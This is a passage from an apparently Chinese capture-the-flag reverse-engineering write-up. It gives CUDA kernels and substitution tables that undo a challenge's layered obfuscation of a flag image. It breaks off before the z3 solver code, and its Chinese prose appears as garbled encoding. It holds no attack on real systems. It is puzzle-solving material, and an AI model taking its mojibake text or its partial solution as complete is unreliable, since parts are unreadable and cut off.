class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v += cuda_tbox[tmp &amp; <span class="number">0xff</span>] * Input[bid * bdim + i];</span><br><span class="line">        tmp = tmp * <span class="number">5</span> + <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &lt; <span class="number">4137823</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> tmp1 = (v &lt;&lt; <span class="number">3</span>) | ((v &amp; <span class="number">224</span>) &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        <span class="type">int</span> tmp2 = tmp1 * <span class="number">13</span> + (tid ^ bid);</span><br><span class="line">        v = cuda_sbox[(cuda_tbox[i &amp; <span class="number">0xff</span>] ^ tmp2) &amp; <span class="number">0xff</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = (<span class="type">uint8_t</span>)v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™å‡ºLayer3å’ŒLayer2çš„è§£å¯†å‡½æ•°ï¼ŒLayer1æ˜¯è¿åŠ¨æ¨¡ç³Šå·ç§¯ç®—æ³•ï¼Œä¸å¯é€†ï¼Œåªèƒ½æœ€åç”¨ç®—æ³•è¿˜åŸæ¸…æ™°ç‚¹ã€‚</p><p>Layer3è¿™è¾¹å€’æ•°ç¬¬äºŒä¸ªé‚£ä¸ª256çš„å¾ªç¯æ˜¯åœ¨pythonç”¨z3è§£ï¼Œå…¶ä½™éƒ¨åˆ†éƒ½ç›´æ¥ç”¨cudaä»£ç è§£å¯†å³å¯ã€‚</p><p>åº•ä¸‹ç”¨åˆ°çš„cuda_invsboxæ˜¯sboxç®—å‡ºçš„é€†sboxæ•°æ®ã€‚</p><p>cudaè§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">__constant__ <span class="type">uint8_t</span> cuda_sbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_tbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_invsbox[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> oTid = cuda_invsbox[bid];</span><br><span class="line">    <span class="type">int</span> oBid = cuda_invsbox[tid];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Value = Input[bid * bdim + tid];</span><br><span class="line"></span><br><span class="line">    Output[oBid * bdim + oTid] = Value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer3_part1</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xC5ä¸º13çš„é€†å…ƒ</span></span><br><span class="line">    <span class="type">uint8_t</span> inv_13 = <span class="number">0xC5</span>;</span><br><span class="line">    <span class="type">uint16_t</span> v = Input[CurIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4137823</span> - <span class="number">1</span>; i &gt;= <span class="number">8</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        v = cuda_invsbox[v &amp; <span class="number">0xff</span>];</span><br><span class="line">        <span class="type">int</span> tmp2 = v ^ cuda_tbox[i &amp; <span class="number">0xff</span>];</span><br><span class="line">        <span class="type">int</span> tmp1 = ((tmp2 - (tid ^ bid)) * inv_13) &amp; <span class="number">0xff</span>;</span><br><span class="line">        v = (tmp1 &gt;&gt; <span class="number">3</span>) | (tmp1 &lt;&lt; <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = v &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer3_part2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= bid &amp; tid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((CurIndex &amp; <span class="number">7</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = *(<span class="type">uint32_t</span>*)(Input + CurIndex);</span><br><span class="line">        <span class="type">uint32_t</span> v1 = *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>);</span><br><span class="line">        <span class="type">uint32_t</span> sum = <span class="number">1786956040</span> + (<span class="number">-1708609273</span>) * <span class="number">3238567</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3238567</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum -= <span class="number">-1708609273</span>;</span><br><span class="line">            v0 += ((v1 &lt;&lt; <span class="number">4</span>) + <span class="number">621668851</span>) ^ ((v1 &gt;&gt; <span class="number">5</span>) - <span class="number">862448841</span>) ^ (v1 + sum);</span><br><span class="line">            v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + <span class="number">1386807340</span>) ^ ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">2007053320</span>) ^ (v0 + sum);</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex) = v0;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>) = v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= tid | bid;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = Input[CurIndex];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚Layer3è§£å¯†ä»£ç è°ƒç”¨éƒ¨åˆ†ï¼Œåªå…ˆè§£å¯†æœ€åé‚£ä¸ªå¤§å¾ªç¯ï¼Œç„¶å256å¾ªç¯éƒ¨åˆ†è½¬åˆ°pythonè¿›è¡Œz3æ±‚è§£ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>,</span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tbox[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x7C</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0xC4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x2A</span>, <span class="number">0xFE</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC8</span>, <span class="number">0x7C</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x58</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xAC</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAE</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB6</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3E</span>, <span class="number">0xF6</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0xA4</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x70</span>, <span class="number">0xD8</span>, <span class="number">0x30</span>, <span class="number">0x14</span>, <span class="number">0x04</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xC2</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0x06</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0x26</span>, <span class="number">0xB2</span>, <span class="number">0x74</span>, <span class="number">0x08</span>, <span class="number">0x82</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3A</span>, <span class="number">0xD6</span>, <span class="number">0xB2</span>, <span class="number">0x28</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB0</span>, <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0xCA</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0x38</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCE</span>, <span class="number">0xD0</span>, <span class="number">0xEE</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x4C</span>, <span class="number">0x32</span>, <span class="number">0x84</span>, <span class="number">0x44</span>, <span class="number">0xF8</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0xA8</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0x8E</span>, <span class="number">0x92</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0xF4</span>,</span><br><span class="line">    <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0xFE</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xCC</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0xEC</span>, <span class="number">0x5E</span>, <span class="number">0x96</span>, <span class="number">0x44</span>, <span class="number">0x16</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x7E</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x5C</span>, <span class="number">0x18</span>, <span class="number">0x72</span>, <span class="number">0x60</span>, <span class="number">0x80</span>, <span class="number">0x4E</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEF</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0A</span>, <span class="number">0xDA</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x48</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x90</span>, <span class="number">0x94</span>, <span class="number">0xE4</span>, <span class="number">0x78</span>, <span class="number">0xE6</span>, <span class="number">0xC8</span>, <span class="number">0x36</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xD4</span>, <span class="number">0x4E</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0xDC</span>, <span class="number">0x74</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0xBC</span>, <span class="number">0x8A</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x60</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x9E</span>, <span class="number">0xE0</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0x68</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9A</span>, <span class="number">0x1E</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0xCE</span>, <span class="number">0x54</span>, <span class="number">0x28</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA0</span>, <span class="number">0x88</span>, <span class="number">0x0C</span>, <span class="number">0xBE</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x40</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x0E</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBA</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        invSbox[sbox[i]] = i;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* Input = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">256</span> * <span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">readFile</span>(<span class="string">&quot;deep_flag.bmp&quot;</span>, Input, <span class="number">14</span> + <span class="number">40</span> + <span class="number">1024</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_sbox, sbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_tbox, tbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_invsbox, invSbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="type">uint8_t</span>* InPtr&#123;&#125;, * OutPtr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;InPtr, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;OutPtr, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(InPtr, Input, <span class="number">0x10000</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">dim3 <span class="title">Blocks</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span>, <span class="title">Threads</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    Re_Layer3_part1 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (InPtr, OutPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Input, OutPtr, <span class="number">0x10000</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">writeToFile</span>(<span class="string">&quot;Steg2&quot;</span>, Input, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaFree</span>(InPtr);</span><br><span class="line">    <span class="built_in">cudaFree</span>(OutPtr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] Input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3æ±‚è§£éƒ¨åˆ†ä»£ç ï¼š</p><p>ç›´æ¥<code>python a.py num</code>è¿™æ ·è¿è¡Œï¼Œæœ€ånumæ˜¯ä¸‹æ 